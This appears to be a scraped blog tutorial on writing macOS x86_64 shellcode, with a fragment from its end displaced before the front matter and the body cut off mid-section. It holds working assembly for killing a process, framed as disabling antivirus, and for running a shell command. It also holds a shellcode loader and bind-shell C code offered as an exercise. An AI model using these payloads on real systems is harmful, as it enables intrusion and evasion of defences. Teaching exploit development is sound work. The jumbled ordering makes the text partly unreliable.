WEXITSTATUS(status));\n        } else if (WIFSIGNALED(status)) {\n            printf(\"[parent] child killed by signal %d\\n\", WTERMSIG(status));\n        } else {\n            printf(\"[parent] child ended with status 0x%x\\n\", status);\n        }\n\n        // small sleep to allow any async side-effects to settle\n        usleep(200000);\n\n        const char *check_path = \"/tmp/Pwned.txt\";\n        if (access(check_path, F_OK) == 0) {\n            printf(\"[parent] Success: '%s' exists.\\n\", check_path);\n            return 0;\n        } else {\n            printf(\"[parent] Failure: '%s' not found (errno=%d: %s)\\n\",\n                   check_path, errno, strerror(errno));\n            return 3;\n        }\n    }\n}\n```\n\nThe loader‚Äôs job is simple: it stores raw machine-code bytes (the shellcode) in a C `unsigned char` array, allocates a memory region with execute permission, copies the bytes into that region, casts the region pointer to a function pointer, and then calls it. That direct transfer of control is what lets the program run arbitrary machine code in the address space of the process. Because the shellcode can call `execve`, `_exit`, crash, or otherwise change the process state, the loader must be written with the understanding that control might never return to the original C runtime after the call into the shellcode. In the original single-process loader, `unsigned char code[] = { ... };` places the bytes in the program‚Äôs data segment; `size_t len = sizeof(code);` computes the number of bytes to map and copy. The program then calls `mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0)`. This requests an anonymous (no-file-back) memory mapping with read, write and execute permissions; `NULL` lets the kernel choose the address, `len` is the requested size, and `MAP_ANON|MAP_PRIVATE` means the mapping is private and not backed by a file. If `mmap` fails (returns `MAP_FAILED`) the loader prints the error and exits. After a successful mapping the loader uses `memcpy(exec, code, len)` to place the shellcode bytes into the mapped pages, then casts the `void *` returned by `mmap` to a function pointer (`int (*func)() = (int(*)())exec;`) and calls `func()`. Casting a data pointer to a code pointer and invoking it is implementation-defined in the C standard, but is the de‚Äëfacto technique used on `POSIX` systems for this purpose. What can happen when the call to `func()` executes depends entirely on what the shellcode does. If the shellcode is written to return cleanly it will restore registers and the stack appropriately and the loader continues execution after the call. If the shellcode invokes `execve()` successfully, the kernel replaces the entire process image with a new program, so none of the loader‚Äôs code after the call executes. If the shellcode calls `_exit()` or the process receives a fatal signal (segfault, illegal instruction), the process terminates and again no post-call statements run. Shellcode that corrupts the stack or registers without restoring them will also produce undefined behavior in the loader when control returns. In short: seeing only the pre-exec print usually means the shellcode either replaced or terminated the process or crashed it before your post-exec prints could run. A forked-loader variant is useful because it isolates the untrusted shellcode in a child process while the parent remains alive to observe results. When the program `fork()`, the child repeats the mapping, copy and invocation of the shellcode; any `execve` or `_exit` inside the child affects only the child. The parent calls `waitpid(child, &status, 0)` to get the child‚Äôs exit status and can report whether the child exited normally, was killed by a signal, or returned a particular code. The parent can also check for side-effects such as files written by the child (for example `/tmp/Pwned.txt`) and print reliable diagnostics. This pattern is ideal for debugging shellcode that tends to replace or terminate its host process ‚Äî the parent becomes the stable observer.\n\n- Compile and Test the shellcode with the loader\n\n```C\nzeyadazima.com% clang -o cloader cloader.c\nzeyadazima.com% ./cloader \n[parent 29373] spawned child 29374, waiting...\n[child 29374] executing shellcode (93 bytes)...\n[parent] child exited with status 0\n[parent] Success: '/tmp/Pwned.txt' exists.\n```\n\nAs we can see our shellcode executed successfully with no issues.\n\n# Exercises\n\nIf you want to dive deeper more, you can do this exercise which is involving in creating a `BindShell` shellcode and execute it. \n\nHere all the things you need for the excersice:\n\n- BindShell `C` code\n\n```C\n// Source - https://stackoverflow.com/q\n// Posted by gatorface, modified by community. See post 'Timeline' for change history\n// Retrieved 2025-11-10, License - CC BY-SA 3.0\n\n// Author:  Julien Ahrens (@MrTuxracer)\n// Website:  http://www.rcesecurity.com \n\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\nint main(void)\n{\n    int i; // used for dup2 later\n    int sockfd; // socket file descriptor\n    int clientfd; // client file descriptor\n    socklen_t socklen; // socket-length for new connections\n\n    struct sockaddr_in srv_addr; // server aka listen address\n    struct sockaddr_in cli_addr; // client address\n\n    srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address\n    srv_addr.sin_port = htons( 1337 ); // server port, converted to network byte order\n    srv_addr.sin_addr.s_addr = htonl (INADDR_ANY); // listen on any address, converted to network byte order\n\n    // create new TCP socket\n    sockfd = socket(2, 1, 0);\n\n    // bind socket\n    bind( sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr) );\n\n    // listen on socket\n    listen(sockfd, 0);\n\n    // accept new connections\n    socklen = sizeof(cli_addr);\n    clientfd = accept(sockfd, (struct sockaddr *)&cli_addr, &socklen );\n\n    // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)\n    for(i = 0; i <= 2; i++)\n        dup2(clientfd, i);\n\n    // magic\n    // execve( \"/bin/sh\", NULL, NULL );\n\n    //UPDATE: fixed exec call, shell still not returned to\n    // client connecting with execl or proper execve\n    execl(\"/bin/sh\", \"/bin/sh\", (char *)NULL);\n}\n\n```\n\nTasks:\n\n- Use `execve()` instead of `execl`\n- Collect the syscall for `socket`,`bind`,`listen`,`accept` and `dup2`. As you will use it to build your `BindShell`.\n- Study the functions arguments and get it ready for the functions/syscalls\n- Make sure to go around with the `struct`, Cause it's similler to the way we built arrays\n- Make sure to use the kernel source code to hop-around to find a variable value, like the `#define AF_INET` for example and explore the source code to help you creating your shellcode.\n\n## Help ?\n\nIf you got any questions or need help, You can contact me:\n- [Linkedin](https://www.linkedin.com/in/zer0verflow/)\n- [Twitter/X](https://x.com/AzimaZeyad)\n- Email: [contact@zeyadazima.com](mailto:contact@zeyadazima.com)\n- Discord: `.killer_1337` including `.`\n\n# Conclusion\n\nWe explored the fundamentals of writing shellcode on `macOS` for the `x86_64` architecture. We set up a proper lab environment, understood the `XNU` kernel and its syscall classes, and clarified calling conventions and register usage crucial for crafting shellcode. By following a structured workflow‚Äîstarting from `C` code, identifying syscalls, converting to assembly, and handling arguments‚Äîwe successfully created shellcodes for printing text, terminating processes, and executing commands. Through these examples, we demonstrated practical techniques such as handling arguments on the stack, using position-independent code, and correctly invoking syscalls in the `BSD` subsystem of `macOS`. This foundation sets the stage for more advanced topics.\n\n\n\n\n# References\n\n- https://codebrowser.dev/\n- https://man.freebsd.org/\n- https://pubs.opengroup.org\n- https://man7.org/linux/man-pages/\n- https://opensource.apple.com/releases/\n- https://github.com/apple-oss-distributions/xnu\n- https://xcodereleases.com\n- https://newosxbook.com\n","source":"_posts/2025-11-24-shellcoding-on-macos-64.md","raw":"---\ntitle: macOS Shellcoding in depth on x86_6\nauthor: Zeyad Azima\ndate: 2025-11-24 00:00:00\ncategories:\n  - Exploit Development\ntags:\n  - MacOS\ntoc: true\ndescription: \"macOS Shellcoding in depth on x86_64.\"\ncover: /images/site/posts/macos/image.psd.png\n---\n\n# Introduction\n\nThis guide explores shellcoding on the `x86_64` architecture for `macOS`, bypassing the traditional x86 starting point for a practical reason: with the release of macOS 10.15 (`Catalina`), Apple discontinued support for `32-bit` applications entirely. Since `x86_64` maintains backward compatibility with x86 code anyway, focusing on `64-bit` shellcoding makes the most sense for modern `macOS` systems. Before diving in, you'll need at least a basic understanding of assembly language‚Äîthis isn't an assembly tutorial, so if you're unfamiliar with the fundamentals, take some time to learn them first and return when you're ready for the challenge. Rather than immediately jumping into cryptic assembly instructions, this guide follows a practical workflow: start by writing code in `C`, identify the necessary system calls, and then translate everything into assembly. This approach leverages the wealth of existing `C` documentation and resources, making the process significantly more manageable. You'll find countless examples of how to build network clients, manipulate processes, or execute commands in `C`, but you'd be hard-pressed to find someone talking about implementing these same tasks purely in assembly. Let's start with our Blogpost.\n\n> You can find all the code on my github: [https://github.com/Zeyad-Azima/macOShellcoding](https://github.com/Zeyad-Azima/macOShellcoding)\n\n# Lab Setup\n\nLet's Setup our Lab and the required tools, Let's list all the other tools we need. \n\n- Homebrew\n\n```sh\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n```\n\n- Xcode: \n\n```\nWe can download it from `AppStore`.\nor: https://xcodereleases.com\n```\n\n- Xcode Command Line Tools (CLT)\n\n```sh\nxcode-select --install\n```\n\n- Nasm\n\n```sh\nbrew install nasm\n```\n\n- Binutils (`ld`)\n\n```sh\nbrew install binutils\n```\n\nBefore we go on straight to shellcoding, We need to understand some FUNDAMENTALS first we would be using to be able to write shellcodes. As we know the macos kernel (`XNU`) is a hybrid kernel which contains also `BSD`. We need to download the `XNU` source code. Cause we will use it for references in creating ours shellcodes and understanding `syscalls` on `macOS`. We can download it from [here](https://opensource.apple.com/releases/).\n\nNow, We need to download the source code version that matches the macOS you writing the shellcode for. I am on `macOS Sequoia` and the version is `macOS 15.5`. You can use `sw_vers` command to check it.\n\n```sh\n~ % sw_vers\nProductName:\t\tmacOS\nProductVersion:\t\t15.5\nBuildVersion:\t\t24F74\n```\n\nNow, Let's download the `XNU` VERSION FOR it.\n\n![macOS XNU release page](/images/site/posts/macos/xnu-release-page.png)\n\nWhen we scroll down more we can find it.\n\n\n\n![XNU version block](/images/site/posts/macos/xnu-version-block.png)\n\nThat's the version (`xnu-11417.121.6`) of `macOS 15.5`.\n\n# XNU Syscall Classes\nNow, Let's open it with `VSCode` or your favorite `IDE/CodeEditor`.\n\n![XNU source tree in VS Code](/images/site/posts/macos/xnu-tree.png)\n\nAll these files and folders for kernel we will use just some of it to understand the basics, But while we writing our shellcodes we would be navigating a lot through different files and folders. First Let's go to `osfmk/mach/i386/syscall_sw.h`.\n\n![syscall header snippet](/images/site/posts/macos/syscall-header.png)\n\nstarting on line `135` till `152`, That's what matters of us. In here as we know and mentioned before that `XNU` is hybrid, So if you want to make execute a syscall for related to `BSD` you would need to define the entry to it.\n\n```C\n#define SYSCALL_CLASS_SHIFT\t24\n#define SYSCALL_CLASS_MASK\t(0xFF << SYSCALL_CLASS_SHIFT)\n#define SYSCALL_NUMBER_MASK\t(~SYSCALL_CLASS_MASK)\n......\n#define SYSCALL_CLASS_NONE\t0\t/* Invalid */\n#define SYSCALL_CLASS_MACH\t1\t/* Mach */\t\n#define SYSCALL_CLASS_UNIX\t2\t/* Unix/BSD */\n#define SYSCALL_CLASS_MDEP\t3\t/* Machine-dependent */\n#define SYSCALL_CLASS_DIAG\t4\t/* Diagnostics */\n#define SYSCALL_CLASS_IPC\t5\t/* Mach IPC */\n```\n\nIn `XNU` (the kernel underlying `macOS`, `iOS`, etc.), system calls are not uniformly accessed via a single syscall table like in `Linux`. Instead, `XNU` uses syscall classes to route calls through different subsystems. Each system call class is associated with a unique number, which is shifted left by 24 bits (defined by `SYSCALL_CLASS_SHIFT`) to determine its class. So for every class to get the entry it will be as the following:\n\n| Class | Name                  | Value | Shifted Base (`<< 24`) |               |\n|-------|-----------------------|-------|------------------------|----------------------|\n| 0     | `SYSCALL_CLASS_NONE`  | 0     | `0x00000000`           | Invalid              |\n| 1     | `SYSCALL_CLASS_MACH`  | 1     | `0x01000000`           | Mach traps           |\n| 2     | `SYSCALL_CLASS_UNIX`  | 2     | `0x02000000`           | **BSD syscalls**     |\n| 3     | `SYSCALL_CLASS_MDEP`  | 3     | `0x03000000`           | Machine-dependent    |\n| 4     | `SYSCALL_CLASS_DIAG`  | 4     | `0x04000000`           | Diagnostics          |\n| 5     | `SYSCALL_CLASS_IPC`   | 5     | `0x05000000`           | Mach IPC (newer)     |\n\n> BSD = 0x02 << 24 = 0x02000000 ‚Üí 0x2000000\n\nThe `SYSCALL_CLASS_MASK` and `SYSCALL_NUMBER_MASK` are used to extract the class and syscall number respectively. For example, a traditional `BSD` system call such as `execve` (system call number `59` or `0x3b` in hex) in the `SYSCALL_CLASS_UNIX` (number `2`) would be represented as `0x200003b` when passed to the syscall assembly instruction.\n\n```asm\n\n; Assembly example to make a syscall with execve (BSD) in macOS\nmov rax, 0x200003b  ; Load the syscall number for execve (59 with class mask)\nmov rdi, address    ; Address of the command to execute\nmov rsi, argv       ; Pointer to an array of arguments\nmov rdx, envp       ; Pointer to an array of environment variables\nsyscall             ; Make the system call\n```\n\nTo make it clear, You're dining in the `XNU` restaurant, a multi-level establishment where each floor represents a different system call class, and the kitchen routes your order based on a cleverly encoded ticket. The first floor, `SYSCALL_CLASS_MACH` (class 1), serves hearty main courses like task and thread operations, while the second floor, `SYSCALL_CLASS_UNIX` (class 2), specializes in classic `BSD` desserts such as `execve` and `write`. To order a medium-rare steak ‚Äî item number `0x3B` (59) on the Mach floor ‚Äî you must tell the waiter `0x0100003B`, calculated as `(1 << 24) | 0x3B`. Craving tiramisu (`execve`, also #59) from the `BSD` floor? Your order becomes `0x0200003B` ‚Äî same dish number, different floor, computed as `(2 << 24) | 0x3B`. Just like in `XNU`, never shout just ‚Äú59‚Äù ‚Äî the kitchen needs the full encoded number with the class shifted 24 bits left, ensuring your steak doesn‚Äôt arrive as a dessert (and vice versa). Bon app√©tit in the kernel!\n\n# x86_64 Calling Conventions and Registers\n\nIn the **x86-64 System** used by macOS, function arguments are passed via registers in this order: `RDI` holds the 1st argument, `RSI` the 2nd, `RDX` the 3rd (and sometimes the 2nd return value), `RCX` the 4th, `R8` the 5th, and `R9` the 6th. The return value (or syscall number) is placed in `RAX`, while `RIP` points to the next instruction, `RSP` manages the stack (and must be **16-byte aligned** before any function call), `RBP` serves as the frame pointer for stack frames, and `RBX` acts as a general-purpose base register often preserved across calls. If a function requires more than six arguments, additional arguments are passed on the stack. It is essential to ensure that the `RSP` is properly aligned before making a function call. Despite system calls often working without strict alignment, adhering to this requirement is a good practice to avoid unexpected behavior. To illustrate how these registers are used in a function call, consider a function `foo` that takes three arguments.\n\n```asm\n; Assume arg1, arg2, and arg3 are already set with appropriate values\nmov rax, syscall_number\nmov rdi, arg1 ; 1st argument\nmov rsi, arg2 ; 2nd argument\nmov rdx, arg3 ; 3rd argument\nsyscall      ; Execute syscall\n```\n\n## Calling Conventions Table\n\nYou can use this table as a reference.\n\n| Register | Usage |\n|----------|-------|\n| `RDI` | 1st function argument |\n| `RSI` | 2nd function argument |\n| `RDX` | 3rd function argument (and optionally the 2nd return value) |\n| `RCX` | 4th function argument |\n| `R8`  | 5th function argument |\n| `R9`  | 6th function argument |\n| `RAX` | Function return value/Syscall Number |\n| `RIP` | Instruction pointer |\n| `RSP` | Stack pointer (must be 16-byte aligned before calls) |\n| `RBP` | Frame pointer |\n| `RBX` | Base pointer (optional use) |\n\n# Shellcoding\n\nBefore writing our shellcode, To make it easy for ourselves instead of getting lost in all the assembly instructions, The best workflow to do is to write your code in `C`, then we convert it to assembly which will make it very easy for us, As there are references and resources for `C` it will make our process easier. For example, You would find people talking about how to make a client/server in `C` using `socket`. But, you won't find someone(\"insane\") talking about how to make a client/server in assembly. So The process would be as the following:\n- Find `C` functions that we will need in our code.\n- Write our code in `C`.\n- Turn our code into assembly.\n\t- Which including getting our syscall numbers ready.\n\t- Function arguments and types. \n\nLet's go ahead and start with something simple to make things clear.\n\n## Print 'Hello'\n\nWe will start by printing `Hello` into the screen. So let's apply our workflow. Usually when we want to print something in `C`, we use `printf()` function as the following:\n\n```c\n#include <stdio.h>\n\nint main() {\n    printf(\"Hello\");\n    return 0;\n}\n```\n\nNow, As we identified the functions we need which is `printf()`, And we wrote our code the 3rd step is to turn it into assembly. So the first thing we would need is to get the syscall number for `printf()`, We can find all the `syscalls` can be found in `bsd/kern/syscalls.master`.  \n\n\n![syscalls master snippet](/images/site/posts/macos/syscall-master.png)\n\nBut, the thing is we won't find `printf()` in the file. Let's investigate the `printf()` function source code. After investigation, the implementation of `printf()` involves calling other functions till we reach `write` syscall.\n\n### Call Chain: `printf` ‚Üí `write` Syscall\n\n| Step | Function Name |\n|------|---------------|\n| 1 | `printf` |\n| 2 | `vfprintf` |\n| 3 | `__vfprintf_internal` |\n| 4 | `Xprintf_buffer_write` |\n| 5 | `_IO_new_file_overflow` |\n| 6 | `_IO_do_write` |\n| 7 | `new_do_write` |\n| 8 | `_IO_SYSWRITE` |\n| 9 | `__swrite` *(macOS only)* |\n| 10 | `write` *(syscall)* |\n\n\nYou can find the source code files here:\n- [printf.c](https://codebrowser.dev/glibc/glibc/stdio-common/printf.c.html)\n- [vfprintf.c](https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf.c.html)\n- [vfprintf-internal.c](https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf-internal.c.html)\n- [printf_buffer.h](https://codebrowser.dev/glibc/glibc/stdio-common/printf_buffer.h.html)\n- [fileops.c](https://codebrowser.dev/glibc/glibc/libio/fileops.c.html)\n- [libioP.h](https://codebrowser.dev/glibc/glibc/libio/libioP.h.html)\n\nAlso you could just have asked `ChatGPT` or something xD, But keep in mind with complicated shellcodes you would want to go through codes and else cause you always will learn something and upgrade yourself.\n\nNow, When we search for `write` syscall we can see it in the `syscalls.master` file:\n\n\n![printf call chain trace](/images/site/posts/macos/printf-callchain.png)\n\nAs we see the `write` syscall number is `4`. And `write` takes 3 arguments. We need to learn about these argument and how to use it, Which simple can be done by searching it or go to the documentation:\n\n\n![printf flow diagram](/images/site/posts/macos/printf-flow.png)\n\nSo from the description we can know that we need to supply the string pointer to `buf` the second argument and number of bytes (`length`) to the third argument `nbyte`, And for fields/fd or File Descriptor, When we search it we will see that it takes the following values\n- `0 (STDIN_FILENO)`: Represents standard input, typically connected to the keyboard or the input of a pipe.\n- `1 (STDOUT_FILENO)`: Represents standard output, typically connected to the display or the output of a pipe.\n- `2 (STDERR_FILENO)`: Represents standard error, typically connected to the display for error messages.\n\nOur goal here is `STDOUT` which is value `1`. So our syscall will be as the following:\n\n```c\nint main() {\n    const char *message = \"Hello\";\n    write(1, message, 5);\n}\n```\n\nLet's start with writing our shellcode:\n\n```asm\nbits 64\n\nglobal _main\n\n_main:\n\tmov rdi, 1 ; stdout for fd argument\n\tmov rcx, 'Hello' ; put our string value into RCX\n\tpush rcx ; We push our string to the stack\n\tmov rsi, rsp ; we supply the pointer to our string from RSP to RSI which is buf argument\n\tmov rdx, 5 ; nbytes argument (our string length)\n\tmov rax, 0x2000004 ; The BSD syscall class entry + syscall number\n\tsyscall ; invoke/execute syscall\n```\n\nHere our shellcode, starting with `bits 64` to enforce x86-64 mode and `global _main` to export the Mach-O entry point. The first instruction `mov rdi, 1` loads the file descriptor `1` (stdout) into `RDI`, the first argument register as we mentioned before. Next, `mov rcx, 'Hello'` encodes the 5-character string as a 64-bit immediate `0x6f6c6c6548` (little-endian: `'o','l','l','e','H'`) into `RCX`. The `push rcx` then writes these 8 bytes to the stack, placing `'H'` at the new stack pointer and padding the remaining 3 bytes with zeros `0x00` to align the stack, Then `mov rsi, rsp` copies the current stack pointer into `RSI`, Which is the second argument, so it now points directly to the first character `'H'`, forming a valid `char *buf`. The `mov rdx, 5` sets the third argument, which is the number of bytes to write and exactly matching the length of `Hello`. Finally, `mov rax, 0x2000004` loads the `XNU` encoded syscall number: `(SYSCALL_CLASS_UNIX << 24) | 4`, where class `2` routes to the BSD subsystem and `4` selects the `write` entry from `bsd/kern/syscalls.master`. The `syscall` instruction triggers the kernel trap, dispatching through `XNU`‚Äôs unified handler to execute `write(1, \"Hello\", 5)`, printing `Hello` to the terminal.\n\nLet's save our code into file `hello.asm` and compile our code.\n\n- First we will turn the code to object file for `macho64` architecture using `nasm`:\n```sh\nshellcoding % nasm -f macho64 hello.asm\nshellcoding % ls\nhello.asm\thello.o\n```\n\nAs we see we got our object file `hello.o`.\n\n- Second, We will link the required libraries needed for the code to generate the executable using `ld`\n```sh\nshellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macos 15.5 15.5\nld: warning: no platform load command found in 'hello.o', assuming: macOS\nshellcoding % ls\nhello\t\thello.asm\thello.o\n```\n\nHere we can see after linking we got our executable.\n\n> Note: The `-L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib` sets the **library search path** to the macOS 15.5 SDK‚Äôs `usr/lib` directory, ensuring the linker locates the correct version of `libSystem.tbd` ‚Äî Apple‚Äôs modern stub library format that resolves to `libSystem.dylib` at runtime. The `-lSystem` flag explicitly links against **libSystem**, the foundational system library that exports the `syscall` interface, `write`, `exit`, and all BSD/POSIX functions; without it, the `syscall` instruction in our shellcode would remain unresolved, causing a linker error. Finally, `-platform_version macos 15.5 15.5` declares the **minimum deployment target** as macOS 15.5 (Sequoia), embedding the `LC_VERSION_MIN_MACOSX` load command and forcing the use of Sequoia-compatible API stubs and system call encodings ‚Äî essential for forward and backward compatibility on modern Apple silicon and Intel systems.\n\n- Let's run and test our executable:\n```sh\nshellcoding % ./hello \nHellozsh: segmentation fault  ./hello\n```\n\nWe see that our execution results in `segmentation fault`, And the reason for that the program doesn't `return` or in simple words exit. For example, Within the main function in `C`, When return is used in the main function (e.g., `return 0;`), it typically translates to an `exit_group` system call (`exit`). This system call terminates the entire process and returns the specified exit status to the operating system. So, We need to exit after executing our `write` syscall.\n\n## Exit\n\nWe can exit using `exit` syscall, as we can see it in the `syscalls.master` file:\n```c\n1\tAUE_EXIT\tALL\t{ void exit(int rval) NO_SYSCALL_STUB; }\n```\n\nThe syscall number is `1` and it takes only 1 integer argument `rval` which is the value to return. When we go to documentation the `rval` value can be `0` for `EXIT_SUCCESS` (successful execution of a program) or `EXIT_FAILURE` (unsuccessful execution of a program). Let's update our shellcode and add `exit` syscall\n\n```asm\nbits 64\n\nglobal _main\n\n_main:\n\tmov rdi, 1 ; stdout for fd argument\n\tmov rcx, 'Hello' ; put our string value into RCX\n\tpush rcx ; We push our string to the stack\n\tmov rsi, rsp ; we supply the pointer to our string from RSP to RSI which is buf argument\n\tmov rdx, 5 ; nbytes argument (our string length)\n\tmov rax, 0x2000004 ; The BSD syscall class entry + write syscall number\n\tsyscall ; invoke/execute syscall\n\t\n\tmov rax, 0x2000001 ; The BSD syscall class entry + exit syscall\n\tmov rdi, 0 ; arg int rval\n\tsyscall ; invoke/execute syscall\n```\n\nNow, let's repeat the process of compiling to get our executable again and test it.\n\n```sh\nshellcoding % nasm -f macho64 hello.asm\nshellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5\nld: warning: no platform load command found in '/Users/zeyadazima.com/shellcoding/hello.o', assuming: macOS\nshellcoding % ./hello \nHello%                                                           \nshellcoding % \n```\n\nAs we see clearly our code worked perfectly. \n\n## Kill a Process\n\nLet's do another shellcode, And take a scenario in case we found a way to execute a code with high privileges and We need to write a shellcode to kill the `AV` process.\n\nThe `C` code to kill a process is as the following:\n\n```C\n#include <stdio.h>\n#include <signal.h>\n#include <sys/types.h> // For pid_t\n#include <unistd.h>    // For getpid() (optional, for self-killing example)\n\nint main() {\n    pid_t target_pid;\n\n    target_pid = 12345; \n\n    // Sending SIGTERM (graceful termination)\n    kill(target_pid, SIGTERM);\n\n    return 0;\n}\n```\n\nWe can see here we used `kill` function and supply the `PID` and the signal which is `SIGTERM`.\n\nNow, If we search for `kill` in `syscalls.master`. We can find it:\n\n```C\n37\tAUE_KILL\tALL\t{ int kill(int pid, int signum, int posix) NO_SYSCALL_STUB; }\n```\n\nFor the `PID` we will create a test process and get it's `PID` to supply it for the first argument and for the `signum` argument, In the `C` code the value is `SIGTERM` which it will be a pre-defined value in the source code, We can search for `#define SIGTERM` in the `XNU` source code, We will find it at `xnu-xnu-11417.121.6/bsd/sys/signal.h:103`:\n\n```C\n#define SIGKILL 9       /* kill (cannot be caught or ignored) */\n#define SIGBUS  10      /* bus error */\n#define SIGSEGV 11      /* segmentation violation */\n#define SIGSYS  12      /* bad argument to system call */\n#define SIGPIPE 13      /* write on a pipe with no one to read it */\n#define SIGALRM 14      /* alarm clock */\n#define SIGTERM 15      /* software termination signal from kill */\n#define SIGURG  16      /* urgent condition on IO channel */\n#define SIGSTOP 17      /* sendable stop signal not from tty */\n```\n\nSo we can see that `SIGTERM` value is `15`, But the better option to use `SIGKILL` with value `9` as it will be forced and kill (cannot be caught or ignored). We will supply `9` as the second argument. Now, In the `C` code it doesn't have a 3rd argument as we see for the `syscall`. If we search for `int posix` in the `XNU` source code, We gonna find the following code under `xnu-xnu-11417.121.6/bsd/kern/kern_sig.c:1373`:\n\n```C\nint\nkill(proc_t cp, struct kill_args *uap, __unused int32_t *retval)\n{\n\tproc_t p;\n\tkauth_cred_t uc = kauth_cred_get();\n\tint posix = uap->posix;         /* !0 if posix behaviour desired */\n\n\tAUDIT_ARG(pid, uap->pid);\n\tAUDIT_ARG(signum, uap->signum);\n\n\tif ((u_int)uap->signum >= NSIG) {\n\t\treturn EINVAL;\n\t}\n```\n\nWe can see from apple comment on the source code that, if we want `POSIX` behaviour in killing the process we have to supply anything other than `0`. And after more searching and asking diff `AI` chatbots i got the following:\n\n| Value               | Meaning                     |\n|---------------------|-----------------------------|\n| `posix = 0`         | Mach (legacy) signal behavior |\n| `posix = 1` (or any `!0`) | POSIX/BSD signal behavior |\n\n> Note: usually when you see extra arguments that was not mentioned or supplyed in the `C` code, It means that the argument is optional and not really required so you always can supply `0` or `NULL` as a value to the optional/non-required arguments.\nLet's run our test process using a simple infinity loop running in background:\n\n```sh\nshellcoding % while true; do sleep 10; done &\n[2] 27646\nshellcoding % ps -p 27646\n  PID TTY           TIME CMD\n27646 ttys061    0:00.01 -zsh\n```\nthe `PID` is `27646`\n\nNow, Lets write our shellcode:\n\n```asm\nbits 64\n\nglobal _main\n\n_main:\n\tmov rdi, 27646 ; 1st argument PID\n\tmov rsi, 9 ; 2nd argument signum\n\tmov rdx, 0 ; 3rd argument posix\n\tmov rax, 0x2000025 ; The BSD syscall class entry + 0x25 (which is 37 in hex) kill syscall\n\tsyscall\n\t\n\tmov rax, 0x2000001 ; The BSD syscall class entry + exit syscall\n\tmov rdi, 0 ; arg int rval\n\tsyscall ; invoke/execute syscall\n```\n\nIt's already clear here, We passed our arguments as the following; `PID` for `RDI`, then `signum` for `RSI` and After that, `posix` to `RDX` and setup our `syscall`. Finally, We exit gracefully using `exit` syscall.\n\n```sh\nshellcoding % nasm -f macho64 killer.asm                                                                                                       \nshellcoding % ld -o killer killer.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5\nld: warning: no platform load command found in '/Users/zeyadazima.com/shellcoding/killer.o', assuming: macOS\nshellcoding % ./killer \nshellcoding % \n[2]  - killed     while true; do; sleep 10; done\nshellcoding % ps -p 27646\n  PID TTY           TIME CMD\n```\n\nAs we can see clearly, The process has been killed successfully.\n\n## Execute Command\nNow, The exciting parts where we need to execute commands. Let's bring our `C` code to execute commands on the system. Which is usually in `C` it's done through `system()` function. But remember that on the `XNU` has `BSD`. So Let's search for `C` code where execute commands using `BSD` functions.\n\n```C\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/wait.h>\n\nint main() {\n    pid_t pid;\n    char *const argv[] = {\"/bin/ls\", \"-l\", NULL}; // Command and its arguments\n    char *const envp[] = {NULL}; // Environment variables (can be customized)\n\n    execve(argv[0], argv, envp);\n   \n\n    return 0;\n}\n```\n\nAs we can see here it uses `execv()` function and it takes 3 arguments. lET'S SEARCH FOR it in the `syscalls.master`:\n\n```C\n59\tAUE_EXECVE\tALL\t{ int execve(char *fname, char **argp, char **envp) NO_SYSCALL_STUB; }\n```\n\nSo it takes a pointer to the `fname` which is the file name, then pointer to array `argp` and pointer to another array `envp`.\n\n![write syscall chain snippet](/images/site/posts/macos/write-syscall-chain.png)\n\nWe can see that in the description of `execve()`, the first argument is the path to the binary we want to execute which is gonna be the shell in this case `/bin/zsh`. Then for the second argument it takes array the arguments of the executable or program we passing and the first element in the array has to be the same file name `/bin/zsh`, So the array will be as the following, if we want to execute`echo \"W00tW00t\" > /tmp/Pwned.txt`  command `{\"/bin/zsh\",\"-c\",\"echo 'W00tW00t' > /tmp/Pwned.txt\"}`. The third argument as mentioned is optional so we can supply a pointer to `NULL` array.\n\nLet's go on and write our shellcode:\n\n```asm\nbits 64\n\nglobal _main\n\n_main:\n\n\tmov rcx, 0 \t; NULL Terminator\n\tpush rcx \t; push the NULL Terminator to the stack\n\tmov rdx, '/bin/zsh' \t;  our file/executable name\n\tpush rdx \t; push the file/executable name to the stack\n\tmov rdi, rsp \t; fname => 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name\n\tmov rbx, '-c' \t; argp[1] => the 2nd element in the arguments array\n\tpush rbx \t; push argp[1] to the stack\n\tmov rbx, rsp \t; save the argp[1]('-c') pointer to RBX\n\tpush rcx \t; push the NULL Terminator to the stack\n```\n\nLet's stop here for a while, We need to place our 3rd element which is our command `echo \"W00tW00t\" > /tmp/Pwned.txt`, Which is for a string to long and to divide it to push it on the stack will not be the best thing our shellcode will be so long. Instead we gonna use a trick to place it on the stack for example:\n\n```asm\n call array\n db 'echo \"W00tW00t\" > /tmp/Pwned.txt', 0\n```\n\n`call` pushes the address of the following `db` string onto the stack. Which will make it easier for us.\n\n```asm\nbits 64\n\nglobal _main\n\n_main:\n\n\txor rcx, rcx \t; NULL Terminator\n\tpush rcx \t; push the NULL Terminator to the stack\n\tmov rdx, '/bin/zsh' \t;  our file/executable name\n\tpush rdx \t; push the file/executable name to the stack\n\tmov rdi, rsp \t; fname => 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name\n\tmov rbx, '-c' \t; argp[1] => the 2nd element in the arguments array\n\tpush rbx \t; push argp[1] to the stack\n\tmov rbx, rsp \t; save the argp[1]('-c') pointer to RBX\n\tpush rcx \t; push the NULL Terminator to the stack\n\n; classic position-independent trick\n\tcall array ; call the array label to setup the array for argp\n\tdb 'echo \"W00tW00t\" > /tmp/Pwned.txt', 0 ; arg[2] which is our command and including the NULL Terminator\n```\n\nNow, We need to make 